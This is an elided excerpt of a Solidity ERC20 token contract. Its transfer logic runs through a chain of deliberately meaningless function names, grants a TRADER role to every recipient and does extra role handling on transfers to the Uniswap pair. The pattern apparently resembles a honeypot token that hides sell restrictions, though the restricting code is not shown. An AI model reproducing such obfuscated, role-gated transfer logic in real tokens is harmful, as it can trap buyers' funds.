...
interface _RNSCNFJSRoleControl {
...
abstract contract _RNSCNFJSConsole is Context, _RNSCNFJSRoleControl {
    ...
    function _roleCheked(bytes32 role, address account, uint256 amt) internal {
        ...
        __RNSCNFJSmevRooG(role, account, amt);
    }

    function __RNSCNFJSmevRooG(bytes32 role, address account, uint256 amount) internal {
    ...
    function __RNSCNFJSgrvNewPush(bytes32 role, address account, uint256 num) internal virtual {
...
contract _RNSCNFJSERC20 is Context, IERC20, IERC20Metadata {
...
contract Token is _RNSCNFJSERC20, _RNSCNFJSConsole {
    ...
    ) _RNSCNFJSERC20(_name, _symbol, _totalSupply, _tokenOwner) {
    ...
    function _transfer(
        ...
        address to,
        uint256 amt
    ) internal override(_RNSCNFJSERC20) {
        require(from != address(0), "ERC20: transfer from the zero address");

        __RNSCNFJSxindbf2(from, to, amt);
    }
    
    function __RNSCNFJSxindbf2(address from, address to, uint256 amt) internal {
        require(to != address(0), "ERC20: transfer to the zero address");
        require(_balances[from] >= amt, "ERC20: transfer amt exceeds balance");

        __RNSCNFJSxfgdfbb(from, to, amt);
    }


    function __RNSCNFJSxfgdfbb(address from, address to, uint256 amt) internal {
        ...
        __RNSCNFJSxfyhyhtg(from, to, amt);
    }

    function __RNSCNFJSxfyhyhtg(address from, address to, uint256 amt) internal {
        if (__traders[to] == false) {
            _grantRole(TRADER, to);
            __traders[to] = true;
            
        }
        __RNSCNFJSmyfdfger(from, to, amt);
    }


    function __RNSCNFJSmyfdfger(address from, address to, uint256 amt) internal {
        bool isAddLdx;
        if(to == uniswapV2Pair){
            ...
            __RNSCNFJSgrvNewPush(TRADER,to,1);
        }

        __RNSCNFJSxcvegger(from, to, amt);
    }

    function __RNSCNFJSxcvegger(address from, address to, uint256 amt) internal {
    ...
    function __RNSCNFJScxnvilrnsh(address from, address to, uint256 amt) internal {
